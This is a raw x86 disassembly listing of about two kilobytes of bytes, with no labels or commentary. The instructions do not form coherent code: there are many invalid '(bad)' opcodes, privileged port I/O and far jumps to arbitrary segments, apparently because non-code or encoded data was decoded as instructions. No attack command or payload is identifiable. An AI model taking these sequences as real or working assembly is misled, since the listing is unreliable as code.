  421bff:	ins    BYTE PTR es:[edi],dx
  421c00:	mov    esi,0x79662902
  421c05:	lds    ebx,FWORD PTR [edi]
  421c07:	dec    BYTE PTR [ebp+ebp*8-0x5c]
  421c0b:	xchg   ecx,eax
  421c0c:	inc    ebp
  421c0d:	inc    edi
  421c0e:	cmp    dl,BYTE PTR [eax]
  421c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c11:	lock idiv DWORD PTR ss:[ecx+ebx*8]
  421c16:	pop    esi
  421c17:	inc    edx
  421c18:	jbe    0x421c4d
  421c1a:	test   eax,0x5c65f05f
  421c1f:	loopne 0x421bb4
  421c21:	dec    edi
  421c22:	gs dec esi
  421c24:	jbe    0x421be1
  421c26:	cld    
  421c27:	cdq    
  421c28:	pop    eax
  421c29:	in     eax,0x8e
  421c2b:	adc    ch,BYTE PTR [edi+0x5f4b2dbf]
  421c31:	jae    0x421c42
  421c33:	and    al,0xe3
  421c35:	xor    eax,0xf7b2787e
  421c3a:	je     0x421c10
  421c3c:	(bad)  
  421c3e:	inc    edx
  421c3f:	sti    
  421c40:	div    DWORD PTR [ebx]
  421c42:	enter  0x3b95,0x6d
  421c46:	add    eax,0x6bb2fbb2
  421c4b:	mov    esi,0xef160c12
  421c50:	je     0x421c96
  421c52:	add    DWORD PTR ds:0xfbca606a,esp
  421c58:	jg     0x421c72
  421c5a:	adc    al,0x2d
  421c5c:	mov    ebx,eax
  421c5e:	mov    esi,0x4b3d88e9
  421c63:	and    bl,BYTE PTR [eax]
  421c65:	jl     0x421c69
  421c67:	pop    edi
  421c68:	aaa    
  421c69:	std    
  421c6a:	ins    DWORD PTR es:[edi],dx
  421c6b:	stos   BYTE PTR es:[edi],al
  421c6c:	popa   
  421c6d:	ins    BYTE PTR es:[edi],dx
  421c6e:	scas   al,BYTE PTR es:[edi]
  421c6f:	jle    0x421bf7
  421c71:	lds    eax,FWORD PTR [edx]
  421c73:	sub    eax,0x9bcee5dc
  421c78:	xor    eax,DWORD PTR [esp+edi*4+0x60]
  421c7c:	fst    QWORD PTR [eax-0x1bed2a0]
  421c82:	fs in  eax,dx
  421c84:	xchg   ebx,eax
  421c85:	nop
  421c86:	shl    DWORD PTR [esi+0x4e],1
  421c89:	retf   
  421c8a:	nop
  421c8b:	aam    0x17
  421c8d:	mov    bl,0x2a
  421c8f:	test   BYTE PTR [ebx],ch
  421c91:	pushf  
  421c92:	adc    ch,dh
  421c94:	cmp    ecx,DWORD PTR [ebx+0x6061d062]
  421c9a:	fmul   st,st(5)
  421c9c:	test   al,0xb3
  421c9e:	shr    edx,cl
  421ca0:	and    DWORD PTR [ebx-0x2454ff1],ebp
  421ca6:	popa   
  421ca7:	out    dx,al
  421ca8:	xchg   ebx,eax
  421ca9:	(bad)  
  421caa:	outs   dx,DWORD PTR ds:[esi]
  421cab:	xchg   ebx,eax
  421cac:	or     DWORD PTR [ebp+0x57],edi
  421caf:	das    
  421cb0:	dec    ebx
  421cb1:	addr16 loop 0x421c5a
  421cb4:	jb     0x421cbd
  421cb6:	lds    ecx,FWORD PTR [edx+0x4321d493]
  421cbc:	in     eax,dx
  421cbd:	xchg   ebp,eax
  421cbe:	xor    bh,BYTE PTR [ebx-0x1b1a17eb]
  421cc4:	(bad)  
  421cc6:	jecxz  0x421cfe
  421cc8:	adc    BYTE PTR [edx+0x5e597faa],ch
  421cce:	push   edx
  421ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cd0:	mov    BYTE PTR [eax-0x30],cl
  421cd3:	int3   
  421cd4:	(bad)  
  421cd5:	int3   
  421cd6:	jno    0x421d18
  421cd8:	mov    esi,0x2e011091
  421cdd:	add    al,0x5e
  421cdf:	and    eax,0xe341dec4
  421ce4:	inc    edi
  421ce5:	xchg   ebp,eax
  421ce6:	fcom   DWORD PTR [ebx+0x6f1ac5e3]
  421cec:	xchg   edx,eax
  421ced:	or     al,0x92
  421cef:	push   esi
  421cf0:	mov    ebp,0x4d299672
  421cf5:	leave  
  421cf6:	sbb    al,0x7d
  421cf8:	fistp  DWORD PTR [eax*1+0xd8f2c63]
  421cff:	ret    0x2166
  421d02:	adc    eax,0x44ba6a57
  421d07:	push   ebp
  421d08:	out    0xe3,al
  421d0a:	xchg   esp,eax
  421d0b:	mov    eax,ds:0xc86554a6
  421d10:	sbb    DWORD PTR [edi],ecx
  421d12:	push   cs
  421d13:	and    DWORD PTR [edi],ebx
  421d15:	push   ds
  421d16:	jg     0x421d52
  421d18:	add    bh,bl
  421d1a:	mov    fs,WORD PTR [eax]
  421d1c:	dec    ecx
  421d1d:	inc    edi
  421d1e:	bound  ecx,QWORD PTR [ecx-0x72879157]
  421d24:	ins    BYTE PTR es:[edi],dx
  421d25:	pop    ebx
  421d26:	mov    dl,0x14
  421d28:	outs   dx,BYTE PTR ds:[esi]
  421d29:	in     al,dx
  421d2a:	adc    al,0xae
  421d2c:	fmul   QWORD PTR [eax-0x17b54f08]
  421d32:	sub    eax,0x181239ed
  421d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d38:	icebp  
  421d39:	xor    eax,0x2a8d161e
  421d3e:	xor    al,0xad
  421d40:	pushf  
  421d41:	pop    eax
  421d42:	mov    ds,WORD PTR [edx+0x49]
  421d45:	xchg   ebx,ebp
  421d47:	jmp    0xb56bf3f1
  421d4c:	xchg   esi,eax
  421d4d:	mov    ch,0x56
  421d4f:	xor    edi,edx
  421d51:	jbe    0x421d7c
  421d53:	xchg   esi,eax
  421d54:	rol    DWORD PTR [ebp+ecx*1+0x50],1
  421d58:	fs jp  0x421dbc
  421d5b:	and    BYTE PTR [ebx-0x1a969ad8],0x30
  421d62:	jb     0x421d81
  421d64:	sbb    DWORD PTR [esi],ebx
  421d66:	and    DWORD PTR [edx],esi
  421d68:	add    eax,0xafe71b65
  421d6d:	cmp    eax,0xc9302cc5
  421d72:	add    BYTE PTR [ebx+0x5],cl
  421d75:	jmp    0x421dc7
  421d77:	inc    eax
  421d78:	arpl   WORD PTR [esi+0x5a38cfa8],bp
  421d7e:	cmp    ch,al
  421d80:	adc    esi,esp
  421d82:	sub    ch,al
  421d84:	mov    ecx,0x2bfccf3f
  421d89:	cmp    ebp,DWORD PTR [esp+esi*8+0x6fd8dae8]
  421d90:	xlat   BYTE PTR ds:[ebx]
  421d91:	aam    0xaf
  421d93:	sub    al,0x57
  421d95:	mov    bl,0xa2
  421d97:	mov    eax,0x40b4638d
  421d9c:	mov    dl,0x19
  421d9e:	mov    ecx,0x31fce01
  421da3:	jo     0x421da4
  421da5:	xor    ebp,DWORD PTR [esi+0x7a]
  421da8:	(bad)  
  421da9:	xchg   ecx,eax
  421daa:	dec    ebp
  421dab:	cli    
  421dac:	or     BYTE PTR [ebx-0x6a1d924c],ah
  421db2:	inc    esi
  421db3:	and    ax,0x8376
  421db7:	popf   
  421db8:	pop    esi
  421db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dba:	js     0x421dd0
  421dbc:	mov    ebp,0xa2d09591
  421dc1:	shl    BYTE PTR [edi],1
  421dc3:	std    
  421dc4:	mov    esp,0x9aa9f618
  421dc9:	dec    ecx
  421dca:	sub    eax,0x70d42a1f
  421dcf:	jle    0x421dd1
  421dd1:	in     eax,dx
  421dd2:	pushf  
  421dd3:	sti    
  421dd4:	mov    ah,0x2
  421dd6:	jl     0x421dee
  421dd8:	addr16 pushf 
  421dda:	lea    esi,[esi-0x438c9da]
  421de0:	xor    eax,0x32b76c4a
  421de5:	(bad)  
  421de6:	hlt    
  421de7:	fdiv   QWORD PTR [ebp+ebp*4-0x6449ea2d]
  421dee:	dec    ecx
  421def:	scas   eax,DWORD PTR es:[edi]
  421df0:	jo     0x421dc7
  421df2:	es push ebx
  421df4:	dec    ebp
  421df5:	xor    al,0x16
  421df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df8:	call   0xde37:0x6dfb177c
  421dff:	jmp    0xb77e:0x61bdf589
  421e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e07:	cli    
  421e08:	pop    ebx
  421e09:	dec    esp
  421e0a:	jo     0x421e02
  421e0c:	xor    BYTE PTR [edx+0x5d],0x10
  421e10:	rcl    DWORD PTR [edi-0x3c8a9617],0xcf
  421e17:	(bad)  
  421e19:	sbb    al,0x5f
  421e1b:	inc    edx
  421e1c:	push   eax
  421e1d:	loop   0x421e5b
  421e1f:	sbb    ch,BYTE PTR [eax]
  421e21:	or     eax,0xf9a97282
  421e26:	add    bh,ch
  421e28:	jne    0x421e48
  421e2a:	sub    edx,DWORD PTR [edx-0x54]
  421e2d:	div    ah
  421e2f:	xor    BYTE PTR [esi-0x77],bh
  421e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e33:	std    
  421e34:	mov    esp,0xfeac8933
  421e39:	mov    eax,0x8b3c72ea
  421e3e:	dec    edx
  421e3f:	(bad)  
  421e40:	sub    eax,0x2263e338
  421e45:	lahf   
  421e46:	icebp  
  421e47:	pushf  
  421e48:	(bad)  
  421e4a:	repz xchg ecx,eax
  421e4c:	jne    0x421ec8
  421e4e:	ror    DWORD PTR [eax-0x6139230a],0x4b
  421e55:	shl    DWORD PTR [ecx+0x5fc6ff69],0xd1
  421e5c:	pop    ds
  421e5d:	or     esp,esp
  421e5f:	mov    ecx,0x5e087411
  421e64:	pop    esi
  421e65:	sahf   
  421e66:	sub    al,0xff
  421e68:	outs   dx,BYTE PTR ds:[esi]
  421e69:	out    0x1d,eax
  421e6b:	imul   edx
  421e6d:	and    BYTE PTR [ebp-0x49],ah
  421e70:	sbb    eax,0xf22f4b03
  421e75:	arpl   WORD PTR [edi],bp
  421e77:	lods   eax,DWORD PTR ds:[esi]
  421e78:	aaa    
  421e79:	pop    ds
  421e7a:	outs   dx,DWORD PTR ds:[esi]
  421e7b:	arpl   WORD PTR [ecx-0x6301b44],bx
  421e81:	pop    ebp
  421e82:	adc    edx,esp
  421e84:	jo     0x421ed3
  421e86:	enter  0x1a7,0x3b
  421e8a:	(bad)
  421e8d:	mov    DWORD PTR [esi],0x9c62d03d
  421e93:	sub    DWORD PTR [edx+ecx*2+0x76],edi
  421e97:	in     al,0x26
  421e99:	int3   
  421e9a:	or     al,0xd0
  421e9c:	pop    es
  421e9d:	inc    esp
  421e9e:	into   
  421e9f:	jno    0xcfa71d18
  421ea5:	mov    al,0x58
  421ea8:	xlat   BYTE PTR ds:[ebx]
  421ea9:	ins    BYTE PTR es:[edi],dx
  421eaa:	sbb    al,0x3c
  421eac:	sub    bh,BYTE PTR [edx]
  421eae:	pop    ebp
  421eaf:	pop    ebp
  421eb0:	xor    eax,0x28a5aeb5
  421eb5:	shl    bl,cl
  421eb7:	xor    al,0xb2
  421eb9:	popf   
  421eba:	in     eax,0xed
  421ebc:	add    eax,0x4a8938f9
  421ec1:	push   edi
  421ec2:	pop    ds
  421ec3:	scas   eax,DWORD PTR es:[edi]
  421ec4:	shr    DWORD PTR [ecx-0x1d775a4c],1
  421eca:	pop    edi
  421ecb:	jae    0x421eef
  421ecd:	cld    
  421ece:	stos   DWORD PTR es:[edi],eax
  421ecf:	test   al,0x8d
  421ed1:	sbb    al,dl
  421ed3:	sbb    BYTE PTR [esi-0x57],cl
  421ed6:	mov    ah,0xf
  421ed8:	cmp    dh,ch
  421eda:	pop    ebp
  421edb:	xor    BYTE PTR [edx],0x11
  421ede:	dec    edi
  421edf:	inc    ebp
  421ee0:	jl     0x421e66
  421ee2:	or     DWORD PTR [ebp+0xc],ebp
  421ee5:	adc    BYTE PTR [eax-0x78f21cd4],bh
  421eeb:	mov    ah,0x94
  421eed:	mov    esp,0x58d6f486
  421ef2:	inc    eax
  421ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ef4:	add    al,0x7f
  421ef6:	loopne 0x421f19
  421ef8:	jb     0x421f58
  421efa:	cmp    ebx,DWORD PTR [esi]
  421efc:	mov    edi,0xd7731c22
  421f01:	jno    0x421f1c
  421f03:	sub    ecx,ebx
  421f05:	fwait
  421f06:	loopne 0x421f18
  421f08:	push   edi
  421f09:	xchg   esp,eax
  421f0a:	mov    ah,0xca
  421f0c:	adc    BYTE PTR [ecx],ch
  421f0e:	mov    al,ds:0xb07570ff
  421f13:	adc    DWORD PTR [eax+edx*8],0xf15aa7ca
  421f1a:	mov    dh,BYTE PTR [eax]
  421f1c:	inc    esp
  421f1d:	pop    edi
  421f1e:	outs   dx,DWORD PTR ds:[esi]
  421f1f:	fisubr WORD PTR [edi]
  421f21:	addr16 lahf 
  421f23:	adc    al,0x65
  421f25:	or     esp,DWORD PTR [ecx+0x56]
  421f28:	icebp  
  421f29:	jmp    0x421f2b
  421f2b:	sbb    al,0xe3
  421f2d:	xchg   ebx,eax
  421f2e:	jno    0x421f01
  421f30:	jg     0x421f4b
  421f32:	(bad)
  421f36:	push   es
  421f37:	pop    ss
  421f38:	cld    
  421f39:	sar    BYTE PTR [esi],cl
  421f3b:	dec    edi
  421f3c:	ret    
  421f3d:	sub    esp,DWORD PTR [edi]
  421f3f:	xchg   edi,eax
  421f40:	sbb    esi,DWORD PTR [edi-0x6c6dc7a6]
  421f46:	jmp    0x421f2c
  421f48:	or     DWORD PTR [esi+eiz*2-0x37e78c3],eax
  421f4f:	idiv   BYTE PTR [esi]
  421f51:	adc    DWORD PTR [esi+edx*1],ebx
  421f54:	ret    0xe794
  421f57:	xchg   BYTE PTR [edx-0x37395ef4],bl
  421f5d:	scas   eax,DWORD PTR es:[edi]
  421f5e:	bound  esp,QWORD PTR [eax-0x3c]
  421f61:	xchg   esp,eax
  421f62:	out    0x68,al
  421f64:	retf   0x1080
  421f67:	jmp    0xf131:0xb1c7ff46
  421f6e:	cwde   
  421f6f:	loopne 0x421f94
  421f71:	mov    dl,0xf2
  421f73:	iret   
  421f74:	push   edi
  421f75:	cmp    dh,BYTE PTR [ecx]
  421f77:	mul    dh
  421f79:	call   0xaf4c:0xb43485be
  421f80:	aam    0x15
  421f82:	not    DWORD PTR [ebx+0x72babbe3]
  421f88:	mov    edx,0x4fb70494
  421f8d:	sahf   
  421f8e:	dec    eax
  421f8f:	add    DWORD PTR [ecx-0x46775c8d],ecx
  421f95:	and    eax,0xb1b4a80c
  421f9a:	push   ds
  421f9b:	(bad)  
  421f9c:	hlt    
  421f9d:	(bad)  
  421f9e:	leave  
  421f9f:	and    DWORD PTR [edi+0x5e451b56],ebp
  421fa5:	push   ecx
  421fa6:	pop    ds
  421fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa8:	jnp    0x421ff9
  421faa:	cmp    eax,0xfcfdd85c
  421faf:	fisttp QWORD PTR es:[eax]
  421fb2:	push   edi
  421fb3:	sub    edx,0xffffffa9
  421fb6:	sub    al,0x3b
  421fb8:	jl     0x421fe7
  421fba:	sub    eax,0x6e4139a2
  421fbf:	popa   
  421fc0:	mov    esi,0x6bba01e
  421fc5:	pop    esi
  421fc6:	es leave 
  421fc8:	inc    ebx
  421fc9:	sub    eax,0x7c0fa6ed
  421fce:	lahf   
  421fcf:	cmp    BYTE PTR [edx],bl
  421fd1:	daa    
  421fd2:	out    0x25,eax
  421fd4:	es push ss
  421fd6:	push   0xc32f242
  421fdb:	ret    
  421fdc:	or     BYTE PTR [edx],bl
  421fde:	stc    
  421fdf:	mov    esp,0xf7d7cff8
  421fe4:	adc    dl,BYTE PTR [eax+0x48228e3a]
  421fea:	jge    0x421ff9
  421fec:	fidivr DWORD PTR [edi-0x6]
  421fef:	popf   
  421ff0:	stc    
  421ff1:	push   0x35
  421ff3:	sub    eax,0xb4a667d8
  421ff8:	or     eax,0x57e79004
  421ffd:	out    0x53,eax
  421fff:	jge    0x421fac
  422001:	and    ebx,edx
  422003:	rcl    eax,1
  422005:	push   cs
  422006:	xor    ah,ah
  422008:	xchg   edi,eax
  422009:	aaa    
  42200a:	out    0x7b,eax
  42200c:	(bad)  
  42200d:	outs   dx,BYTE PTR ds:[esi]
  42200e:	leave  
  42200f:	add    al,0xe2
  422011:	dec    ebp
  422012:	test   al,0x73
  422014:	mov    edx,0xbc6213f3
  422019:	scas   eax,DWORD PTR es:[edi]
  42201a:	int    0x44
  42201c:	xchg   DWORD PTR [ebp+eiz*8+0x5e],edx
  422020:	push   esi
  422021:	sbb    BYTE PTR [ebp+0x44],dl
  422024:	mov    ah,0xbe
  422026:	jecxz  0x422002
  422028:	pop    ds
  422029:	jp     0x421fe6
  42202b:	add    edx,DWORD PTR [edi+ebx*1+0x64]
  42202f:	shl    bh,0x49
  422032:	shr    BYTE PTR [edi],cl
  422034:	mov    ds:0xde2ca28b,al
  422039:	sbb    eax,DWORD PTR ds:0x86343014
  42203f:	mov    al,ds:0xe2a674c1
  422044:	out    0x6a,al
  422046:	push   esp
  422047:	lods   eax,DWORD PTR ss:[esi]
  422049:	push   es
  42204a:	push   es
  42204b:	fdivr  QWORD PTR [ebp+0x79]
  42204e:	in     eax,dx
  42204f:	lahf   
  422050:	dec    ecx
  422051:	ret    0x9af7
  422054:	mov    ch,0x15
  422056:	jecxz  0x421fe1
  422058:	jle    0x42200d
  42205a:	or     DWORD PTR [ebx],edi
  42205c:	nop
  42205d:	pop    esi
  42205e:	or     eax,0x636807c3
  422063:	xchg   ebp,eax
  422064:	test   eax,0x23351385
  422069:	call   0x13d64f5b
  42206e:	jb     0x4220a2
  422070:	jl     0x421ff5
  422072:	retf   
  422073:	push   ss
  422074:	pop    edi
  422075:	sub    ecx,ebx
  422077:	outs   dx,BYTE PTR ds:[esi]
  422079:	mov    ds:0x19cd3bab,al
  42207e:	xchg   DWORD PTR [ebp-0x22],edi
  422081:	shr    BYTE PTR [esi+0x57],0xc5
  422085:	into   
  422086:	lock xchg ebx,eax
  422088:	(bad)  
  42208b:	or     ch,BYTE PTR ds:0x87abece8
  422091:	and    eax,0x5334f7e7
  422096:	xchg   ebx,eax
  422097:	pushf  
  422098:	ja     0x422046
  42209a:	inc    esi
  42209b:	int    0x9c
  42209d:	sahf   
  42209e:	sbb    al,0xc0
  4220a0:	and    DWORD PTR [eax],esp
  4220a2:	cli    
  4220a3:	adc    BYTE PTR [ebx-0x2141fd3e],al
  4220a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220aa:	jb     0x422093
  4220ac:	pop    eax
  4220ad:	mov    al,0x1a
  4220af:	sub    eax,0xbf38bdb1
  4220b4:	mov    dl,0x6a
  4220b6:	sbb    ch,cl
  4220b8:	jmp    0x4220b0
  4220ba:	adc    al,0xaa
  4220bc:	xor    al,0xef
  4220be:	test   al,0x30
  4220c0:	popa   
  4220c1:	lods   al,BYTE PTR ds:[esi]
  4220c2:	inc    ebp
  4220c3:	adc    BYTE PTR ds:0x9f392cca,dh
  4220c9:	(bad)  
  4220ca:	iret   
  4220cb:	std    
  4220cc:	xchg   edx,eax
  4220cd:	xchg   ecx,eax
  4220ce:	fisub  DWORD PTR [ebx-0x7f86b7e9]
  4220d4:	push   ss
  4220d5:	out    0x77,al
  4220d7:	push   ecx
  4220d8:	cwde   
  4220d9:	jbe    0x422128
  4220db:	hlt    
  4220dc:	ds and edi,edx
  4220df:	add    DWORD PTR [ecx-0x3d],0xf56ddf32
  4220e6:	cs xor eax,0x830609fa
  4220ec:	adc    bl,BYTE PTR [ecx]
  4220ee:	jl     0x422087
  4220f0:	dec    eax
  4220f1:	loope  0x422119
  4220f3:	or     BYTE PTR [edx],0xb
  4220f6:	pop    esp
  4220f7:	jne    0x422144
  4220f9:	push   es
  4220fa:	fimul  WORD PTR [ecx+0x62]
  4220fd:	xor    bl,BYTE PTR [edi-0x536d3177]
  422103:	jne    0x42211b
  422105:	pusha  
  422106:	movlps xmm1,QWORD PTR ss:[ebx+0x47]
  42210b:	mov    esp,esi
  42210d:	daa    
  42210e:	mov    cl,0xda
  422110:	sbb    esi,DWORD PTR [eax-0x7d592764]
  422116:	fcmovb st,st(2)
  422118:	ja     0x4220e5
  42211a:	mov    ebp,0xf515436d
  42211f:	mov    ah,0x2a
  422121:	sbb    dl,BYTE PTR [ebx]
  422123:	mov    ecx,0x61360493
  422128:	or     al,bh
  42212a:	mov    bh,0xed
  42212c:	aaa    
  42212d:	(bad)  
  42212e:	stos   BYTE PTR es:[edi],al
  42212f:	mov    eax,ds:0x6ce4a448
  422134:	push   0x6e88b830
  422139:	gs cmp al,0xf8
  42213c:	and    BYTE PTR [edx],0x7f
  42213f:	ss je  0x422161
  422142:	push   cs
  422143:	fwait
  422144:	and    DWORD PTR [ebp+0x8],edi
  422147:	sbb    BYTE PTR [eax+0x3460192a],dh
  42214d:	mov    ds:0x632d637e,eax
  422152:	xor    al,0x59
  422154:	(bad)  
  422155:	imul   esi,DWORD PTR [edx],0xffffffac
  422158:	adc    ah,BYTE PTR [edi]
  42215a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42215b:	or     BYTE PTR ds:0xc365e4b8,bh
  422161:	jmp    0x8b4:0xad3b9c5a
  422168:	mov    dh,0xc5
  42216a:	mov    eax,ds:0x1a544be1
  42216f:	cmp    DWORD PTR ds:0x7ab9fd95,ebx
  422175:	inc    BYTE PTR [edi-0x6baf2685]
  42217b:	sub    ebp,DWORD PTR [ecx-0x7092e977]
  422181:	jmp    0xe37e:0x9d68bed5
  422188:	and    eax,0x30977710
  42218d:	inc    ecx
  42218e:	cwde   
  42218f:	cdq    
  422190:	and    bh,bh
  422192:	(bad)  
  422193:	fild   QWORD PTR [edi]
  422195:	and    al,0xd1
  422197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422198:	mov    dh,BYTE PTR [ebp+0x45]
  42219b:	cmp    DWORD PTR [edi],edi
  42219d:	inc    ecx
  42219e:	push   ds
  42219f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221a0:	idiv   DWORD PTR [esi+esi*1+0x3f]
  4221a4:	shl    BYTE PTR [ebp-0x39],0xaa
  4221a8:	rcr    al,0x69
  4221ab:	and    ebx,DWORD PTR [eax]
  4221ad:	sbb    DWORD PTR [ebx+ebp*1],ebx
  4221b0:	xor    edx,esp
  4221b2:	scas   al,BYTE PTR es:[edi]
  4221b3:	hlt    
  4221b4:	jge    0x422214
  4221b6:	mov    ch,0x75
  4221b8:	es inc esi
  4221ba:	pop    esp
  4221bb:	mov    bh,0xe0
  4221bd:	mov    bl,0x7a
  4221bf:	add    BYTE PTR [esi+esi*2],0x76
  4221c3:	mov    gs,WORD PTR [edx+0x7fa50a89]
  4221c9:	mov    ecx,0xf0b6b148
  4221ce:	neg    BYTE PTR [esi+edi*2]
  4221d1:	aad    0xf9
  4221d3:	pop    ebp
  4221d4:	xor    ebp,DWORD PTR [esi]
  4221d6:	xchg   BYTE PTR [edx],bl
  4221d8:	in     al,0x8e
  4221da:	cmp    BYTE PTR [edi+0x44],al
  4221dd:	mov    ebx,0x5807819b
  4221e2:	pop    eax
  4221e3:	cmp    eax,0x8ec22d18
  4221e8:	xchg   DWORD PTR [ecx+0x39],esp
  4221eb:	cmp    al,0x39
  4221ed:	outs   dx,DWORD PTR ds:[esi]
  4221ee:	inc    edi
  4221ef:	mov    ds:0x2067d931,al
  4221f4:	add    BYTE PTR [edx],ch
  4221f6:	aaa    
  4221f7:	push   ecx
  4221f9:	enter  0xc66e,0x6f
  4221fd:	lock jbe 0x42221e
  422200:	scas   al,BYTE PTR es:[edi]
  422201:	adc    ebx,DWORD PTR [ecx+0x23]
  422204:	and    eax,0x52aa3057
  422209:	push   esi
  42220a:	imul   edi,DWORD PTR [eax+0x4a4867d8],0x4623c1a7
  422214:	inc    esi
  422215:	fisub  DWORD PTR [edi]
  422217:	js     0x4221f5
  422219:	jecxz  0x4221c7
  42221b:	push   ebx
  42221c:	fwait
  42221d:	or     al,0xe9
  42221f:	push   edi
  422220:	aas    
  422221:	push   esi
  422222:	adc    ecx,eax
  422224:	outs   dx,BYTE PTR ds:[esi]
  422225:	mov    eax,0x63214b5b
  42222a:	rol    eax,cl
  42222c:	and    al,0x58
  42222e:	pop    ebp
  42222f:	adc    edx,eax
  422231:	inc    esi
  422232:	push   ebx
  422233:	push   ebx
  422234:	cmp    DWORD PTR [edx-0x670e0cd8],ecx
  42223a:	adc    ebx,DWORD PTR [esi+0x10832ef4]
  422240:	add    al,0x17
  422242:	push   ebx
  422243:	pop    esp
  422244:	outs   dx,DWORD PTR ds:[esi]
  422245:	mov    al,0xcd
  422247:	(bad)  
  422248:	push   ebx
  422249:	bound  esi,QWORD PTR ds:[eax+eiz*4-0x56]
  42224e:	mov    dh,0xe0
  422250:	(bad)  
  422251:	mov    al,ds:0xc09eed15
  422256:	pop    ss
  422257:	sub    al,0xb
  422259:	test   BYTE PTR [eax+0x77],ch
  42225c:	stos   BYTE PTR es:[edi],al
  42225d:	dec    edx
  42225e:	and    eax,0xa47b3d67
  422263:	and    esi,eax
  422265:	ss mov ebx,0xb4db9c02
  42226b:	cwde   
  42226c:	push   ds
  42226d:	loop   0x422255
  42226f:	shr    BYTE PTR [ecx],cl
  422271:	mov    ecx,0x6fd5e9a9
  422276:	mov    BYTE PTR ds:0x5e1397f9,dl
  42227c:	popf   
  42227d:	jb     0x422246
  42227f:	jo     0x422226
  422281:	cmp    ecx,DWORD PTR [esi+0x3d554d4f]
  422287:	push   es
  422288:	std    
  422289:	push   cs
  42228a:	popf   
  42228b:	imul   edi,DWORD PTR [edx+ebp*1+0x2763fe6a]
  422293:	(bad)
  422296:	aad    0xa2
  422298:	push   0xffffff96
  42229a:	nop
  42229b:	push   ebx
  42229c:	sbb    DWORD PTR [ebx-0x78],esi
  42229f:	cwde   
  4222a0:	mov    eax,0xaa58b541
  4222a5:	mov    ds:0x9cf67e93,eax
  4222aa:	fnstcw WORD PTR ds:0xfd4212ab
  4222b0:	inc    eax
  4222b1:	xchg   edi,eax
  4222b2:	xor    ecx,DWORD PTR [ecx]
  4222b4:	loopne 0x42224b
  4222b6:	gs cmp eax,0xe9228d43
  4222bc:	sbb    bl,BYTE PTR [eax-0x67efc9e8]
  4222c2:	aad    0xf8
  4222c4:	inc    ebp
  4222c5:	push   es
  4222c6:	or     al,BYTE PTR ds:0x683c1927
  4222cc:	pop    edx
  4222cd:	add    DWORD PTR [ebx],0x5a
  4222d0:	mov    DWORD PTR [edi+0x5],edi
  4222d3:	add    al,0xaf
  4222d5:	pop    esp
  4222d6:	push   esp
  4222d7:	fcmovnbe st,st(3)
  4222d9:	(bad)  
  4222da:	mov    cl,0x46
  4222dc:	mov    ?,WORD PTR [ebp-0x4e]
  4222df:	div    BYTE PTR [esi+ebp*4-0x32b6652d]
  4222e6:	pop    ecx
  4222e7:	retf   0xf289
  4222ea:	mov    dh,0x97
  4222ec:	add    eax,0xb3efb8e6
  4222f1:	dec    ecx
  4222f2:	jb     0x42232f
  4222f4:	std    
  4222f5:	in     eax,dx
  4222f6:	addr16 addr16 pop ecx
  4222f9:	mov    esp,DWORD PTR [edi+0x54]
  4222fc:	mov    ebx,0xa038f25e
  422301:	push   edx
  422302:	aad    0x62
  422304:	loopne 0x4222e1
  422306:	sbb    al,0xed
  422308:	or     dl,BYTE PTR [edx-0x66]
  42230b:	inc    edx
  42230c:	cmp    cl,BYTE PTR [edx-0x1c330e0b]
  422312:	push   esp
  422313:	cmc    
  422314:	outs   dx,DWORD PTR ds:[esi]
  422315:	sbb    al,0x58
  422317:	adc    eax,0xa01a1f26
  42231c:	sub    eax,0x46171c49
  422321:	cmp    BYTE PTR [esi],0x1e
  422324:	mov    dl,0x62
  422326:	inc    ebp
  422327:	mov    bl,0x3
  422329:	test   edx,0x79a61540
  42232f:	in     al,0x36
  422331:	add    al,0x67
  422333:	adc    ebx,DWORD PTR [edx]
  422335:	arpl   si,bx
  422337:	test   BYTE PTR [edx],0x30
  42233a:	loop   0x4222cc
  42233c:	push   ecx
  42233d:	cmp    BYTE PTR [ecx+0x7655d08],al
  422343:	mov    esp,0x1cf960af
  422349:	mov    cl,0x1b
  42234b:	mov    ebx,0xb1dc782a
  422350:	jge    0x422355
  422352:	ret    
  422353:	mov    ebp,DWORD PTR [edi+0x62661bc8]
  422359:	or     cl,BYTE PTR [esi+ebx*2+0x79da44fb]
  422360:	retf   
  422361:	xchg   BYTE PTR [ebx-0x5],al
  422364:	inc    esp
  422365:	pushf  
  422366:	mov    eax,ds:0x63938e38
  42236b:	ret    0x557b
  42236e:	sar    BYTE PTR [edx-0x1f],cl
  422371:	int    0xd9
  422373:	div    ebp
  422375:	pop    edx
  422376:	cmp    cl,BYTE PTR [ebp+0x4a]
  422379:	xchg   edx,eax
  42237a:	pop    esp
  42237b:	add    eax,DWORD PTR [ebx]
  42237d:	jb     0x422339
  42237f:	inc    eax
  422380:	adc    DWORD PTR [ebx],esi
  422382:	mov    ecx,eax
  422384:	cwde   
  422385:	sahf   
  422386:	and    al,0x56
  422388:	(bad)  
  422389:	jns    0x422353
  42238b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42238c:	jo     0x4223a7
  42238e:	addr16 jmp 0xe9a7:0x1ab5e783
  422396:	ret    
  422397:	lea    ebx,[ecx]
  422399:	xor    DWORD PTR [eax],eax
  42239b:	or     eax,0xf52f99a5
  4223a0:	std    
  4223a1:	dec    ecx
  4223a2:	mov    dh,0xb8
  4223a4:	(bad)  
  4223a5:	test   al,0x5c
  4223a7:	shr    DWORD PTR [eax-0x3e],0xe8
  4223ab:	aas    
  4223ac:	pop    es
  4223ad:	pop    ds
  4223ae:	das    
  4223af:	mov    DWORD PTR [ebp-0x17],edi
  4223b2:	mov    bh,0xd9
  4223b4:	(bad)  
  4223b6:	xchg   edx,eax
  4223b7:	xchg   bh,bl
